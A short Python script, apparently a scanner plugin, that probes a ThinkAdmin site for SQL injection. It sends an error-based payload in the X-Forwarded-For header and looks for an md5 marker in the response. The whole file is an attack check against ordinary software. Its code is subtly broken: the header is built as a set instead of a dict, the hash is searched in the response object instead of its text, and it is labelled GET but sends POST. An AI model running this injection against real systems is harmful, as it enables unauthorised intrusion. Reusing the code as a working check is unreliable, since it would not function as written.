#-*- coding:utf-8 -*-
import requests


def check(url):
    results = []
    items = {
        "Url": url, 
        "Vuln": 'thinkadmin_xff_sql_injection_post', 
        "Type": 'GET', 
        "Payload": None
    }

    payload = '?s=/home/article/view_recent/name/1'
    headers = {"X-Forwarded-For:1') and extractvalue(1, concat(0x5c,(select md5(233))))#"}
    try:
        res = requests.post(url + payload, headers = headers)
        # md5(233)
        if 'e165421110ba03099a1c0393373c5b4' in res:
            items['Payload'] = payload
            results.append(items)
            return results
    except Exception as e:
        return e

if __name__ == '__main__':
    pass